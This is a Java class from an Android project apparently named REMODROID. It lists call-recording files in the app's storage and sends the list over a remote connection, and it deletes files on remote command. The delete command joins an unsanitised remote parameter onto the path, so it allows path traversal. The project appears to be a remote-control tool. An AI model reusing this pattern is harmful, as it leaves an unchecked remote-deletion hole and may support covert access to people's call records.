package com.remo.features;

import android.util.Log;
import com.remo.App;
import com.remo.connections.DataHandler;
import com.remo.connections.Feature;

import java.io.File;
import java.io.UnsupportedEncodingException;

public class CallRecordsList extends Feature {

    private static final String RecordsPath = App.get().getApplicationContext().getFilesDir().getAbsolutePath()+"/Rec";
    private static final char NamesSplitChar = '/'; //names
    private static final char TypeSplitChar = '\\'; // dir or file
    public CallRecordsList(){
        UseMainConnection = false;
        Feature_type = DataHandler.eDataType.CALL_RECORDS.ordinal();
        if(!new File(App.get().getApplicationContext().getFilesDir(),"Rec").exists()){
            Log.d("REMODROID",
                  new File(App.get().getApplicationContext().getFilesDir(),"Rec").mkdir()?
                    "Records Location Made now":
                    "Records Location Made before");
        }
    }


    @Override
    public void AsyncTaskFunc(String Params) {
        Log.d("REMODROID","Records Location" + RecordsPath);
        try {
            String toSend = getFiles(RecordsPath);
            Log.d("REMODROID","toSend" + toSend);
            sendPacket(0,toSend.getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e) {
            Log.d("REMODROID","Records List Ex");
        }

    }

    @Override
    public void update(String Params) {
        if(Params.split("=")[0].equals("L")){
            try {
                String toSend = getFiles(RecordsPath);
                Log.d("REMODROID","toSend" + toSend);
                sendPacket(0,toSend.getBytes("UTF-8"));
            } catch (UnsupportedEncodingException e) {
                Log.d("REMODROID","Records List Ex");
            }
        }
        else if(Params.split("=")[0].equals("D")){
                Log.d("REMODROID","Deleting : " + RecordsPath + "/" + Params.split("=")[1]);
                delete(RecordsPath + "/" + Params.split("=")[1]);
        }
    }

    private String getFiles(String dir){
        StringBuilder sb = new StringBuilder();
        File f = new File(dir);
        if( f.exists() ) {
            File[] files = f.listFiles();
            for(int i=0; i<files.length; i++) {
                if(files[i].isFile()) {
                    sb.append(files[i].getName());
                    if(i < files.length - 1)
                        sb.append(NamesSplitChar);
                }
            }
        }
        return sb.toString();
    }


    private boolean delete(String dir) {
        File file = new File(dir);
        if(file == null  || !file.exists()) {
            return false;
        }

        if(file.isDirectory()) {
            File[] list = file.listFiles();

            if(list != null) {

                for(File item : list) {
                    delete(item.getAbsolutePath());
                }

            }
        }

        if(file.exists()) {
            file.delete();
        }

        return !file.exists();
    }

}